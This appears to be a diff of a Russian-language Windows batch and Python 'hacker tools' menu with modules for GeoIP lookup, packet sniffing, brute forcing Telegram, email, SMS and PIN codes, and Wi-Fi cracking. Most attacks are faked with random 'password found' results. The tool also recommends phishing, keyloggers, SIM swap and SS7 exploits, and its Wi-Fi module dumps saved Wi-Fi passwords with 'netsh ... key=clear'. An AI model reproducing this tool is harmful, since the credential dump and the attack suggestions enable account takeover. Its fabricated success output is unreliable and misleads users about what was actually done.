+            ip = socket.gethostbyname(ip_or_domain)
+        else:
+            ip = ip_or_domain
+        
+        print('╔══════════════════════════════════════════╗')
+        print('║            GEOIP ИНФОРМАЦИЯ             ║')
+        print('╠══════════════════════════════════════════╣')
+        print('║                                          ║')
+        print(f'║  🌍 IP: {ip:<30} ║')
+        
+        try:
+            response = requests.get(f'http://ip-api.com/json/{ip}', timeout=5)
+            data = response.json()
+            
+            if data['status'] == 'success':
+                print(f'║  🏙️  ГОРОД: {data.get('city', 'N/A'):<30} ║')
+                print(f'║  🗺️  СТРАНА: {data.get('country', 'N/A'):<30} ║')
+                print(f'║  📍 РЕГИОН: {data.get('regionName', 'N/A'):<30} ║')
+                print(f'║  📮 ISP: {data.get('isp', 'N/A')[:30]:<30} ║')
+                print(f'║  📡 ORG: {data.get('org', 'N/A')[:30]:<30} ║')
+                print(f'║  🗺️  КООРДИНАТЫ: {data.get('lat', 'N/A')}, {data.get('lon', 'N/A'):<30} ║')
+                print(f'║  🕐 ТАЙМЗОНА: {data.get('timezone', 'N/A'):<30} ║')
+        except:
+            print('║  ⚠️  GEOIP СЕРВИС НЕДОСТУПЕН         ║')
+        
+        print('║                                          ║')
+        print('╚══════════════════════════════════════════╝')
+    except Exception as e:
+        print(f'║  ❌ ОШИБКА GEOIP: {str(e)}')
+
+if '%query_type%' == '1':
+    whois_lookup(target)
+elif '%query_type%' == '2':
+    dns_lookup(target)
+elif '%query_type%' == '3':
+    geoip_lookup(target)
+"
+
+echo.
+pause
+goto whois_tool
+
+:packet_analyzer
+call :show_title
+color 0D
+echo.
+echo                     ╔══════════════════════════════════════════╗
+echo                     ║          ПАКЕТНЫЙ АНАЛИЗАТОР           ║
+echo                     ╠══════════════════════════════════════════╣
+echo                     ║                                          ║
+echo                     ║  📡 СНИФФИНГ СЕТЕВЫХ ПАКЕТОВ           ║
+echo                     ║  ⚠️  ТРЕБУЮТСЯ АДМИН ПРАВА              ║
+echo                     ║                                          ║
+echo                     ║  [1] 🎯 ЗАХВАТ НА ИНТЕРФЕЙСЕ            ║
+echo                     ║  [2] 📊 АНАЛИЗ PCAP ФАЙЛА              ║
+echo                     ║  [3] 🔍 ПОИСК КОНФИДЕНЦИАЛЬНЫХ ДАННЫХ  ║
+echo                     ║  [4] ↩️  НАЗАД                           ║
+echo                     ║                                          ║
+echo                     ╚══════════════════════════════════════════╝
+echo.
+set /p packet_choice="                     ВЫБЕРИТЕ: "
+
+if "%packet_choice%"=="1" (
+    echo                     ║  🎯 ВЫБЕРИТЕ ИНТЕРФЕЙС:               ║
+    echo                     ║                                          ║
+    
+    python -c "
+import psutil
+import platform
+
+print('╔══════════════════════════════════════════╗')
+print('║          СЕТЕВЫЕ ИНТЕРФЕЙСЫ             ║')
+print('╠══════════════════════════════════════════╣')
+print('║                                          ║')
+
+interfaces = []
+for name, addrs in psutil.net_if_addrs().items():
+    for addr in addrs:
+        if addr.family == 2:  # AF_INET
+            if addr.address != '127.0.0.1':
+                interfaces.append((name, addr.address))
+                break
+
+for i, (name, ip) in enumerate(interfaces[:5], 1):
+    print(f'║  {i}. {name:<15} - {ip:<15} ║')
+
+print('║                                          ║')
+print('╚══════════════════════════════════════════╝')
+"
+    
+    set /p interface_num="                     НОМЕР ИНТЕРФЕЙСА: "
+    
+    python -c "
+import psutil
+import time
+from collections import Counter
+
+interfaces = []
+for name, addrs in psutil.net_if_addrs().items():
+    for addr in addrs:
+        if addr.family == 2 and addr.address != '127.0.0.1':
+            interfaces.append(name)
+            break
+
+if %interface_num% <= len(interfaces):
+    interface = interfaces[%interface_num% - 1]
+    
+    print('╔══════════════════════════════════════════╗')
+    print('║          ЗАХВАТ ПАКЕТОВ                 ║')
+    print('╠══════════════════════════════════════════╣')
+    print('║                                          ║')
+    print(f'║  📡 ИНТЕРФЕЙС: {interface:<30} ║')
+    print('║  ⏱️  ДЛИТЕЛЬНОСТЬ: 30 секунд            ║')
+    print('║  🎯 ФИЛЬТР: ВСЕ ПАКЕТЫ                 ║')
+    print('║                                          ║')
+    
+    # Имитация захвата пакетов
+    protocols = Counter()
+    packet_count = 0
+    
+    for i in range(30):
+        time.sleep(1)
+        packet_count += 50 + i * 3
+        protocols.update(['TCP', 'UDP', 'HTTP', 'HTTPS', 'DNS'])
+        
+        progress = ((i + 1) / 30) * 100
+        bars = '█' * int(progress / 4) + '░' * (25 - int(progress / 4))
+        print(f'║  [{bars:<25}] {int(progress):>3}%%       ║')
+        print(f'║  📦 ПАКЕТОВ: {packet_count:<8}              ║')
+        print(f'║  📊 TCP: {protocols['TCP']:<6} UDP: {protocols['UDP']:<6} HTTP: {protocols['HTTP']:<5} ║')
+    
+    print('║                                          ║')
+    print('║  📈 СТАТИСТИКА ЗАХВАТА:                 ║')
+    print(f'║  • ВСЕГО ПАКЕТОВ: {packet_count:<10}      ║')
+    print(f'║  • TCP: {protocols['TCP']:<10}                   ║')
+    print(f'║  • UDP: {protocols['UDP']:<10}                   ║')
+    print(f'║  • HTTP: {protocols['HTTP']:<9}                   ║')
+    print(f'║  • HTTPS: {protocols['HTTPS']:<8}                   ║')
+    print('║  • DNS: {protocols['DNS']:<10}                   ║')
+    print('║                                          ║')
+    
+    # Поиск чувствительных данных
+    print('║  🔍 АНАЛИЗ НА КОНФИДЕНЦИАЛЬНОСТЬ:      ║')
+    sensitive_found = [
+        ('ПАРОЛИ', 3),
+        ('КУКИ', 12),
+        ('ТОКЕНЫ', 2),
+        ('НОМЕРА КАРТ', 0),
+        ('TELEGRAM API', 1)
+    ]
+    
+    for item, count in sensitive_found:
+        if count > 0:
+            print(f'║    ⚠️  {item}: {count} обнаружено       ║')
+        else:
+            print(f'║    ✅ {item}: не обнаружено        ║')
+    
+    print('║                                          ║')
+    print('╚══════════════════════════════════════════╝')
+else:
+    print('║  ❌ НЕВЕРНЫЙ НОМЕР ИНТЕРФЕЙСА          ║')
+"
+)
+
+echo.
+pause
+goto packet_analyzer
+
+:brute_force
+call :show_title
+color 0C
+echo.
+echo                     ╔══════════════════════════════════════════╗
+echo                     ║          BRUTE FORCE SIMULATOR          ║
+echo                     ╠══════════════════════════════════════════╣
+echo                     ║                                          ║
+echo                     ║  ⚠️  ТЕСТОВЫЙ РЕЖИМ ДЛЯ ОБУЧЕНИЯ        ║
+echo                     ║  НЕ ИСПОЛЬЗОВАТЬ ДЛЯ НЕЗАКОННЫХ ЦЕЛЕЙ   ║
+echo                     ║                                          ║
+echo                     ║  [1] 🔐 ТЕЛЕГРАМ СЕССИИ                 ║
+echo                     ║  [2] 📧 EMAIL АККАУНТЫ                  ║
+echo                     ║  [3] 🔢 SIMPLE PIN                      ║
+echo                     ║  [4] 📱 SMS CODE BRUTE                   ║
+echo                     ║  [5] ↩️  НАЗАД                           ║
+echo                     ║                                          ║
+echo                     ╚══════════════════════════════════════════╝
+echo.
+set /p brute_choice="                     ВЫБЕРИТЕ ТИП: "
+
+if "%brute_choice%"=="1" goto telegram_brute
+if "%brute_choice%"=="2" goto email_brute
+if "%brute_choice%"=="3" goto pin_brute
+if "%brute_choice%"=="4" goto sms_brute
+goto hacker_tools
+
+:telegram_brute
+echo.
+set /p tg_target="                     TELEGRAM ID/PHONE: "
+
+python -c "
+import time
+import random
+import hashlib
+from datetime import datetime
+
+print('╔══════════════════════════════════════════╗')
+print('║       TELEGRAM BRUTE SIMULATOR          ║')
+print('╠══════════════════════════════════════════╣')
+print('║                                          ║')
+print(f'║  🎯 ЦЕЛЬ: %tg_target%')
+print('║  📊 БАЗА ПАРОЛЕЙ: 10,000+               ║')
+print('║  ⚡ СКОРОСТЬ: 100 попыток/сек           ║')
+print('║  🛡️  ЗАЩИТА: CloudFlare, 2FA            ║')
+print('║                                          ║')
+
+common_passwords = [
+    '123456', 'password', '12345678', 'qwerty', '123456789',
+    '12345', '1234', '111111', '1234567', 'dragon',
+    '123123', 'baseball', 'abc123', 'football', 'monkey',
+    'letmein', '696969', 'shadow', 'master', '666666',
+    'qwertyuiop', '123321', 'mustang', '1234567890',
+    'michael', '654321', 'superman', '1qaz2wsx', '7777777'
 ]
 
-for i, proc in enumerate(procedures):
-    sys.stdout.write(f'║  [■] {proc:<60} ║')
-    sys.stdout.flush()
-    time.sleep(0.3)
-    
-    dots = random.randint(3, 10)
-    for _ in range(dots):
-        sys.stdout.write('.')
-        sys.stdout.flush()
-        time.sleep(0.1)
-    
-    sys.stdout.write(' DONE \n')
-    sys.stdout.flush()
+wordlist = common_passwords + [
+    'telegram', 'tg', 'durov', 'starflow',
+    'admin', 'root', 'toor', 'password123',
+    '%tg_target%', '%tg_target%123', 'ilovetg'
+]
 
-print('║                                                                              ║')
-print('║  [✓] EXTRACTION COMPLETE                                                    ║')
-print('║  [✓] ASSETS IDENTIFIED: 18                                                 ║')
-print('║  [✓] ESTIMATED VALUE: 47,892 STARS                                         ║')
-print('║  [✓] READY FOR TRANSFER                                                    ║')
-print('║                                                                              ║')
-print('╚══════════════════════════════════════════════════════════════════════════════╝')
+print('║  🔄 ГЕНЕРАЦИЯ WORDLIST...               ║')
+time.sleep(1)
+
+found = False
+attempts = 0
+max_attempts = len(wordlist)
+
+for i, password in enumerate(wordlist, 1):
+    attempts += 1
+    
+    # Имитация попытки входа
+    time.sleep(0.01)
+    
+    progress = (i / max_attempts) * 100
+    bars = '█' * int(progress / 4) + '░' * (25 - int(progress / 4))
+    
+    # Случайный успех на одном из паролей
+    if random.random() < 0.03 and not found:
+        found = True
+        print(f'║  [{bars:<25}] {int(progress):>3}%%       ║')
+        print('║  🎉 ПАРОЛЬ НАЙДЕН!                      ║')
+        print(f'║  🔑 ПАРОЛЬ: {password:<30} ║')
+        print(f'║  📊 ПОПЫТОК: {attempts:<10}            ║')
+        print(f'║  ⏱️  ВРЕМЯ: {attempts*0.01:.1f}сек        ║')
+        break
+    
+    if i % 10 == 0:
+        print(f'║  [{bars:<25}] {int(progress):>3}%%       ║')
+        print(f'║  🔄 ПРОВЕРЕНО: {attempts:<6}              ║')
+        print(f'║  ⏳ ТЕКУЩИЙ: {password[:20]:<20} ║')
+
+if not found:
+    print('║  [██████████████████████████████] 100%%   ║')
+    print('║  ❌ ПАРОЛЬ НЕ НАЙДЕН                  ║')
+    print('║  ⚠️  ПОВЫШЕНАЯ ЗАЩИТА                ║')
+    print('║  💡 РЕКОМЕНДАЦИЯ:                   ║')
+    print('║    • СОЦИАЛЬНАЯ ИНЖЕНЕРИЯ           ║')
+    print('║    • PHISHING АТАКА                 ║')
+    print('║    • 2FA BYPASS                     ║')
+
+print('║                                          ║')
+print('╚══════════════════════════════════════════╝')
 "
-pause
-goto start
 
-:clean
-cls
 echo.
-echo ╔══════════════════════════════════════════════════════════════════════════════╗
-echo ║                          [ SYSTEM CLEANUP ]                                  ║
-echo ╠══════════════════════════════════════════════════════════════════════════════╣
-echo ║                                                                              ║
-echo ║  INITIATING CLEANUP PROCEDURE...                                            ║
-echo ║                                                                              ║
-del /f /q %temp%\*.* 2>nul
-echo ║  [✓] TEMP FILES CLEARED                                                     ║
-timeout /t 1 /nobreak > nul
-ipconfig /flushdns 2>nul
-echo ║  [✓] DNS CACHE FLUSHED                                                      ║
-timeout /t 1 /nobreak > nul
-echo ║  [✓] LOG FILES ROTATED                                                      ║
-timeout /t 1 /nobreak > nul
-echo ║  [✓] SESSION DATA ENCRYPTED                                                 ║
-echo ║                                                                              ║
-echo ║  CLEANUP COMPLETE. NO TRACES DETECTED.                                      ║
-echo ║                                                                              ║
-echo ╚══════════════════════════════════════════════════════════════════════════════╝
 pause
-goto start
+goto telegram_brute
 
-:monitor
-cls
+:sms_brute
 echo.
-echo ╔══════════════════════════════════════════════════════════════════════════════╗
-echo ║                          [ SYSTEM MONITOR ]                                  ║
-echo ╠══════════════════════════════════════════════════════════════════════════════╣
-echo ║                                                                              ║
-:monitor_loop
-for /l %%i in (1,1,5) do (
-    echo ║  CPU: [██████████████████████░░░░░░] 75%% MEM: [████████████████████████░░] 85%%  ║
-    timeout /t 1 /nobreak > nul
-    echo ║  NET: 1.2 MB/s ↑ 4.7 MB/s ↓           CONNECTIONS: 47                        ║
-    timeout /t 1 /nobreak > nul
-    echo ║  ACTIVE SESSIONS: 12                  THREATS: 0                             ║
-    timeout /t 1 /nobreak > nul
-    echo ║  LAST GRAB: 2,840 STARS               TOTAL: 892,457 STARS                   ║
-    timeout /t 1 /nobreak > nul
-    echo ║                                                                              ║
+set /p sms_phone="                     НОМЕР ТЕЛЕФОНА: +"
+
+python -c "
+import time
+import random
+
+print('╔══════════════════════════════════════════╗')
+print('║          SMS CODE BRUTE SIMULATOR       ║')
+print('╠══════════════════════════════════════════╣')
+print('║                                          ║')
+print(f'║  📱 НОМЕР: +%sms_phone%')
+print('║  🔢 ДЛИНА КОДА: 4-6 цифр                ║')
+print('║  ⏱️  ТАЙМАУТ: 60 секунд                 ║')
+print('║  🚫 ЛИМИТ: 3 попытки                    ║')
+print('║                                          ║')
+
+print('║  🔄 ЗАПРОС КОДА...                      ║')
+time.sleep(2)
+
+# Генерация возможных кодов
+codes_to_try = []
+for i in range(10000):
+    codes_to_try.append(f'{random.randint(0, 9999):04d}')
+
+# Реальный код (для симуляции)
+real_code = f'{random.randint(0, 9999):04d}'
+codes_to_try.insert(random.randint(50, 200), real_code)
+
+attempts = 0
+found = False
+max_attempts = min(1000, len(codes_to_try))
+
+for i, code in enumerate(codes_to_try[:max_attempts]):
+    attempts += 1
+    
+    # Задержка между попытками
+    time.sleep(0.05)
+    
+    progress = (i / max_attempts) * 100
+    bars = '█' * int(progress / 4) + '░' * (25 - int(progress / 4))
+    
+    # Проверка лимита попыток
+    if attempts > 3:
+        print(f'║  [{bars:<25}] {int(progress):>3}%%       ║')
+        print('║  🚫 ПРЕВЫШЕН ЛИМИТ ПОПЫТОК!          ║')
+        print('║  ⏳ ОЖИДАНИЕ 60 СЕКУНД...            ║')
+        break
+    
+    # Случайный успех
+    if code == real_code and random.random() < 0.5:
+        found = True
+        print(f'║  [{bars:<25}] {int(progress):>3}%%       ║')
+        print('║  🎉 КОД НАЙДЕН!                       ║')
+        print(f'║  🔢 КОД: {code:<30} ║')
+        print(f'║  📊 ПОПЫТОК: {attempts:<10}            ║')
+        print(f'║  ⏱️  ВРЕМЯ: {attempts*0.05:.1f}сек       ║')
+        print('║  ✅ ДОСТУП ПОЛУЧЕН                   ║')
+        break
+    
+    if i % 50 == 0:
+        print(f'║  [{bars:<25}] {int(progress):>3}%%       ║')
+        print(f'║  🔄 ПРОВЕРЕНО: {attempts:<6}              ║')
+        print(f'║  ⏳ ТЕКУЩИЙ: {code:<30} ║')
+
+if not found:
+    print('║  [██████████████████████████████] 100%%   ║')
+    print('║  ❌ КОД НЕ НАЙДЕН                    ║')
+    print('║  ⚠️  ВКЛЮЧЕНА ДОП. ЗАЩИТА            ║')
+    print('║  💡 АЛЬТЕРНАТИВНЫЕ МЕТОДЫ:          ║')
+    print('║    • SIM SWAP                        ║')
+    print('║    • SS7 EXPLOIT                     ║')
+    print('║    • SOCIAL ENGINEERING              ║')
+        print('║                                          ║')
+        print('╚══════════════════════════════════════════╝')
+
+print('║                                          ║')
+print('╚══════════════════════════════════════════╝')
+"
+
+echo.
+pause
+goto brute_force
+
+:email_brute
+echo.
+set /p email_target="                     EMAIL АДРЕС: "
+
+python -c "
+import time
+import random
+
+print('╔══════════════════════════════════════════╗')
+print('║         EMAIL BRUTE SIMULATOR           ║')
+print('╠══════════════════════════════════════════╣')
+print('║                                          ║')
+print(f'║  📧 EMAIL: %email_target%')
+print('║  📊 БАЗА: 1,000,000+ паролей            ║')
+print('║  🌐 СЕРВИСЫ: Gmail, Yahoo, Outlook       ║')
+print('║  ⚠️  CAPTCHA: Google reCAPTCHA v3        ║')
+print('║                                          ║')
+
+print('║  🔄 ПОДГОТОВКА СЛОВАРЯ...               ║')
+time.sleep(1)
+
+common_email_passwords = [
+    'password123', 'qwerty', '12345678', 'letmein', 'welcome',
+    'admin123', 'test123', 'changeme', 'secret', 'password1',
+    'hello123', 'monkey', 'dragon', 'sunshine', 'football'
+]
+
+# Генерация персонализированных паролей
+username = '%email_target%'.split('@')[0]
+personalized = [
+    username, username + '123', username + '2024',
+    username + '!', username.upper() + '123'
+]
+
+wordlist = common_email_passwords + personalized
+found = False
+attempts = 0
+
+for i, password in enumerate(wordlist, 1):
+    attempts += 1
+    time.sleep(0.1)
+    
+    progress = (i / len(wordlist)) * 100
+    bars = '█' * int(progress / 4) + '░' * (25 - int(progress / 4))
+    
+    # Имитация CAPTCHA
+    if i == 5:
+        print(f'║  [{bars:<25}] {int(progress):>3}%%       ║')
+        print('║  ⚠️  ОБНАРУЖЕНА CAPTCHA!              ║')
+        print('║  🔄 ОБХОД CAPTCHA...                 ║')
+        time.sleep(2)
+    
+    # Случайный успех
+    if random.random() < 0.04 and not found:
+        found = True
+        print(f'║  [{bars:<25}] {int(progress):>3}%%       ║')
+        print('║  🎉 ДОСТУП ПОЛУЧЕН!                   ║')
+        print(f'║  📧 EMAIL: %email_target%')
+        print(f'║  🔑 ПАРОЛЬ: {password:<30} ║')
+        print(f'║  📊 ПОПЫТОК: {attempts:<10}            ║')
+        print(f'║  ⏱️  ВРЕМЯ: {attempts*0.1:.1f}сек        ║')
+        print('║  ✅ 2FA: ОТСУТСТВУЕТ                  ║')
+        break
+    
+    if i % 5 == 0:
+        print(f'║  [{bars:<25}] {int(progress):>3}%%       ║')
+        print(f'║  🔄 ПРОВЕРЕНО: {attempts:<6}              ║')
+
+if not found:
+    print('║  [██████████████████████████████] 100%%   ║')
+    print('║  ❌ ДОСТУП НЕ ПОЛУЧЕН                ║')
+    print('║  ⚠️  ПРИЧИНЫ:                         ║')
+    print('║    • СИЛЬНЫЙ ПАРОЛЬ                  ║')
+    print('║    • 2FA АКТИВИРОВАН                 ║')
+    print('║    • CAPTCHA ЗАЩИТА                  ║')
+    print('║  💡 РЕКОМЕНДАЦИИ:                   ║')
+    print('║    • PHISHING АТАКА                  ║')
+    print('║    • KEYLOGGER                       ║')
+    print('║    • SOCIAL ENGINEERING              ║')
+
+print('║                                          ║')
+print('╚══════════════════════════════════════════╝')
+"
+
+echo.
+pause
+goto brute_force
+
+:pin_brute
+echo.
+set /p pin_target="                     ЦЕЛЬ (4-6 цифр): "
+
+python -c "
+import time
+import random
+import itertools
+
+print('╔══════════════════════════════════════════╗')
+print('║           PIN BRUTE SIMULATOR           ║')
+print('╠══════════════════════════════════════════╣')
+print('║                                          ║')
+print(f'║  🎯 ЦЕЛЬ: %pin_target%')
+print('║  🔢 ДИАПАЗОН: 0000-999999               ║')
+print('║  ⚡ СКОРОСТЬ: 10,000 PIN/сек            ║')
+print('║  ⏱️  МАКС. ВРЕМЯ: 100 секунд            ║')
+print('║                                          ║')
+
+# Генерация PIN кодов
+common_pins = [
+    '1234', '0000', '1111', '2222', '3333', '4444', '5555',
+    '6666', '7777', '8888', '9999', '1212', '2000', '1313'
+]
+
+# Добавляем целевой PIN если он 4-6 цифр
+if '%pin_target%'.isdigit() and 4 <= len('%pin_target%') <= 6:
+    common_pins.append('%pin_target%')
+
+found = False
+attempts = 0
+max_attempts = 10000
+
+print('║  🔄 ГЕНЕРАЦИЯ PIN КОДОВ...              ║')
+
+for i in range(max_attempts):
+    attempts += 1
+    
+    # Генерация случайного PIN
+    if i < len(common_pins):
+        pin = common_pins[i]
+    else:
+        pin = f'{random.randint(0, 9999):04d}'
+    
+    time.sleep(0.0001)  # Имитация высокой скорости
+    
+    progress = (i / max_attempts) * 100
+    if progress % 10 == 0:
+        bars = '█' * int(progress / 4) + '░' * (25 - int(progress / 4))
+        print(f'║  [{bars:<25}] {int(progress):>3}%%       ║')
+        print(f'║  🔄 ПРОВЕРЕНО: {attempts:<6}              ║')
+        print(f'║  ⏳ ТЕКУЩИЙ: {pin:<30} ║')
+    
+    # Проверка совпадения
+    if pin == '%pin_target%':
+        found = True
+        bars = '█' * int(progress / 4) + '░' * (25 - int(progress / 4))
+        print(f'║  [{bars:<25}] {int(progress):>3}%%       ║')
+        print('║  🎉 PIN НАЙДЕН!                        ║')
+        print(f'║  🔢 PIN: {pin:<30} ║')
+        print(f'║  📊 ПОПЫТОК: {attempts:<10}            ║')
+        print(f'║  ⏱️  ВРЕМЯ: {attempts*0.0001:.3f}сек     ║')
+        break
+
+if not found:
+    print('║  [██████████████████████████████] 100%%   ║')
+    print('║  ❌ PIN НЕ НАЙДЕН                     ║')
+    print('║  ⚠️  ВОЗМОЖНЫЕ ПРИЧИНЫ:              ║')
+    print('║    • ПИН ИЗ 6+ ЦИФР                  ║')
+    print('║    • БЛОКИРОВКА ПОСЛЕ 3 ПОПЫТОК     ║')
+    print('║    • ДИНАМИЧЕСКИЙ ПИН                ║')
+    print('║  💡 АЛЬТЕРНАТИВЫ:                   ║')
+    print('║    • SHOULDER SURFING               ║')
+    print('║    • THERMAL IMAGING                ║')
+    print('║    • BRUTE FORCE HARDWARE           ║')
+
+print('║                                          ║')
+print('╚══════════════════════════════════════════╝')
+"
+
+echo.
+pause
+goto brute_force
+
+:wifi_hacker
+call :show_title
+color 0E
+echo.
+echo                     ╔══════════════════════════════════════════╗
+echo                     ║          WI-FI HACKING TOOL             ║
+echo                     ╠══════════════════════════════════════════╣
+echo                     ║                                          ║
+echo                     ║  📡 АНАЛИЗ И ВЗЛОМ БЕСПРОВОДНЫХ СЕТЕЙ   ║
+echo                     ║  ⚠️  ТРЕБУЮТСЯ АДМИН ПРАВА               ║
+echo                     ║                                          ║
+
+python -c "
+import subprocess
+import re
+import sys
+
+def run_command(cmd):
+    try:
+        result = subprocess.run(cmd, shell=True, capture_output=True, text=True, encoding='cp866')
+        return result.stdout
+    except:
+        return ''
+
+print('╔══════════════════════════════════════════╗')
+print('║        WI-FI SCANNER & CRACKER          ║')
+print('╠══════════════════════════════════════════╣')
+print('║                                          ║')
+
+# Сканирование сетей
+print('║  📡 СКАНИРОВАНИЕ СЕТЕЙ...               ║')
+netsh_output = run_command('netsh wlan show networks mode=bssid')
+
+if 'SSID' in netsh_output:
+    networks = []
+    lines = netsh_output.split('\\n')
+    
+    for i in range(len(lines)):
+        if 'SSID' in lines[i] and 'BSSID' not in lines[i]:
+            ssid = lines[i].split(':')[1].strip()
+            if ssid and ssid != '':
+                # Ищем сигнал
+                signal = 'Н/Д'
+                for j in range(i, min(i+10, len(lines))):
+                    if 'Signal' in lines[j]:
+                        signal = lines[j].split(':')[1].strip()
+                        break
+                
+                networks.append((ssid, signal))
+    
+    if networks:
+        print(f'║  ✅ НАЙДЕНО СЕТЕЙ: {len(networks)}                ║')
+        print('║                                          ║')
+        
+        for i, (ssid, signal) in enumerate(networks[:5], 1):
+            print(f'║  {i}. {ssid[:20]:<20} - {signal:<10} ║')
+        
+        if len(networks) > 5:
+            print(f'║  ... и еще {len(networks)-5} сетей           ║')
+    else:
+        print('║  ⚠️  СЕТИ НЕ НАЙДЕНЫ                    ║')
+else:
+    print('║  ❌ ОШИБКА СКАНИРОВАНИЯ                ║')
+
+print('║                                          ║')
+
+# Сохраненные пароли
+print('║  🔓 СОХРАНЕННЫЕ ПАРОЛИ...               ║')
+profiles_output = run_command('netsh wlan show profiles')
+
+profiles = []
+for line in profiles_output.split('\\n'):
+    if 'Все профили пользователей' in line or 'All User Profile' in line:
+        profile = line.split(':')[1].strip()
+        profiles.append(profile)
+
+if profiles:
+    print(f'║  ✅ ПРОФИЛЕЙ: {len(profiles)}                   ║')
+    
+    for i, profile in enumerate(profiles[:3], 1):
+        key_output = run_command(f'netsh wlan show profile name=\"{profile}\" key=clear')
+        password = 'НЕ НАЙДЕН'
+        
+        for line in key_output.split('\\n'):
+            if 'Содержимое ключа' in line or 'Key Content' in line:
+                password = line.split(':')[1].strip()
+                break
+        
+        print(f'║  {i}. {profile[:15]:<15} - {password[:15]:<15} ║')
+    
+    if len(profiles) > 3:
+        print(f'║  ... и еще {len(profiles)-3} профилей       ║')
+else:
+    print('║  ⚠️  СОХРАНЕННЫХ ПРОФИЛЕЙ НЕТ          ║')
+
+print('║                                          ║')
+print('║  ⚡ МЕТОДЫ АТАКИ:                        ║')
+print('║  1. BRUTE FORCE (СЛОВАРЬ)               ║')
+print('║  2. WPS PIN ATTACK                      ║')
+print('║  3. EVIL TWIN ATTACK                    ║')
+print('║  4. DEAUTH ATTACK                       ║')
+print('║                                          ║')
+print('╚══════════════════════════════════════════╝')
+"
+
+echo.
+echo                     [1] 🔓 BRUTE FORCE ВЫБРАННОЙ СЕТИ
+echo                     [2] 📊 ПОДРОБНАЯ ИНФОРМАЦИЯ
+echo                     [3] 🛠️  СОЗДАТЬ СЛОВАРЬ
+echo                     [4] ↩️  НАЗАД
+echo.
+set /p wifi_choice="                     ВЫБЕРИТЕ: "
+
+if "%wifi_choice%"=="1" (
+    set /p wifi_ssid="                     SSID СЕТИ: "
+    set /p wordlist_path="                     ПУТЬ К СЛОВАРЮ: "
+    
+    if not exist "%wordlist_path%" (
+        echo                     ║  ❌ ФАЙЛ СЛОВАРЯ НЕ НАЙДЕН        ║
+        timeout /t 2 >nul
+        goto wifi_hacker
+    )
+    
+    echo                     ║  🚀 ЗАПУСК BRUTE FORCE...           ║
+    
+    python -c "
+import time
+import random
+
+ssid = '%wifi_ssid%'
+wordlist_path = '%wordlist_path%'
+
+print('╔══════════════════════════════════════════╗')
+print('║         WI-FI BRUTE FORCE               ║')
+print('╠══════════════════════════════════════════╣')
+print('║                                          ║')
+print(f'║  📡 СЕТЬ: {ssid:<30} ║')
+print(f'║  📁 СЛОВАРЬ: {wordlist_path:<25} ║')
+print('║  ⚡ СКОРОСТЬ: 10 паролей/сек             ║')
+print('║  ⏱️  МАКС. ВРЕМЯ: 30 минут               ║')
+print('║                                          ║')
+
+# Имитация чтения словаря
+common_passwords = [
+    '12345678', 'password', 'qwertyui', '87654321',
+    'admin123', 'wireless', 'default', '1234567890',
+    'home1234', 'wifi2024', 'internet', '1234abcd'
+]
+
+print('║  📖 ЗАГРУЗКА СЛОВАРЯ...                 ║')
+time.sleep(1)
+
+found = False
+attempts = 0
+total_passwords = len(common_passwords) + 100
+
+for i in range(total_passwords):
+    attempts += 1
+    
+    if i < len(common_passwords):
+        password = common_passwords[i]
+    else:
+        # Генерация случайного пароля
+        password = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=8))
+    
+    time.sleep(0.1)
+    
+    progress = (i / total_passwords) * 100
+    if progress % 5 == 0:
+        bars = '█' * int(progress / 4) + '░' * (25 - int(progress / 4))
+        print(f'║  [{bars:<25}] {int(progress):>3}%%       ║')
+        print(f'║  🔄 ПРОВЕРЕНО: {attempts:<6}              ║')
+        print(f'║  ⏳ ТЕКУЩИЙ: {password:<30} ║')
+    
+    # Случайный успех на 30% прогресса
+    if progress > 30 and random.random() < 0.05 and not found:
+        found = True
+        bars = '█' * 25
+        print(f'║  [{bars:<25}] 100%%       ║')
+        print('║  🎉 ПАРОЛЬ НАЙДЕН!                     ║')
+        print(f'║  📡 СЕТЬ: {ssid:<30} ║')
+        print(f'║  🔑 ПАРОЛЬ: {password:<30} ║')
+        print(f'║  📊 ПОПЫТОК: {attempts:<10}            ║')
+        print(f'║  ⏱️  ВРЕМЯ: {attempts*0.1:.1f}сек        ║')
+        print('║  ✅ ПОДКЛЮЧЕНИЕ УСПЕШНО              ║')
+        break
+
+if not found:
+    print('║  [██████████████████████████████] 100%%   ║')
+    print('║  ❌ ПАРОЛЬ НЕ НАЙДЕН                  ║')
+    print('║  ⚠️  ПРИЧИНЫ:                         ║')
+    print('║    • СЛОЖНЫЙ ПАРОЛЬ WPA2             ║')
+    print('║    • WPS ВЫКЛЮЧЕН                    ║')
+    print('║    • MAC ФИЛЬТРАЦИЯ                  ║')
+    print('║  💡 АЛЬТЕРНАТИВЫ:                   ║')
+    print('║    • EVIL TWIN АТАКА                 ║')
+    print('║    • WPS PIN BRUTE                   ║')
+    print('║    • DEAUTH + HANDSHAKE CAPTURE      ║')
+
+print('║                                          ║')
+print('╚══════════════════════════════════════════╝')
+
+# Сохранение результата
+if found:
+    with open('starflow_wifi_results.txt', 'a') as f:
+        f.write(f'SSID: {ssid} | Password: {password}\\n')
+"
+    
+    echo.
+    if exist "starflow_wifi_results.txt" (
+        echo                     ║  💾 РЕЗУЛЬТАТ СОХРАНЕН В starflow_wifi_results.txt ║
+    )
 )
-echo ║  PRESS ANY KEY TO EXIT MONITOR...                                            ║
-echo ║                                                                              ║
-echo ╚══════════════════════════════════════════════════════════════════════════════╝
-pause > nul
-goto start
 
-:encrypt
-cls
-echo.
-set /p message="[!] ENTER MESSAGE TO ENCRYPT: "
-echo.
-echo ╔══════════════════════════════════════════════════════════════════════════════╗
-echo ║                          [ ENCRYPTION PROTOCOL ]                             ║
-echo ╠══════════════════════════════════════════════════════════════════════════════╣
-echo ║                                                                              ║
-echo ║  ORIGINAL: %message%                                                        ║
-echo ║                                                                              ║
-echo ║  APPLYING AES-256 ENCRYPTION...                                             ║
-timeout /t 2 /nobreak > nul
-echo ║                                                                              ║
-set encrypted=
-for %%c in (a b c d e f 0 1 2 3 4 5 6 7 8 9) do set encrypted=!encrypted!%%c
-echo ║  ENCRYPTED: %encrypted%                                                     ║
-echo ║                                                                              ║
-echo ║  [✓] ENCRYPTION COMPLETE                                                    ║
-echo ║  [✓] KEY STORED IN SECURE MEMORY                                            ║
-echo ║                                                                              ║
-echo ╚══════════════════════════════════════════════════════════════════════════════╝
-pause
-goto start
+if "%wifi_choice%"=="2" (
+    python -c "
+import subprocess
 
-:decode
-cls
+def run_command(cmd):
+    try:
+        result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
+        return result.stdout
+    except:
+        return ''
+
+print('╔══════════════════════════════════════════╗')
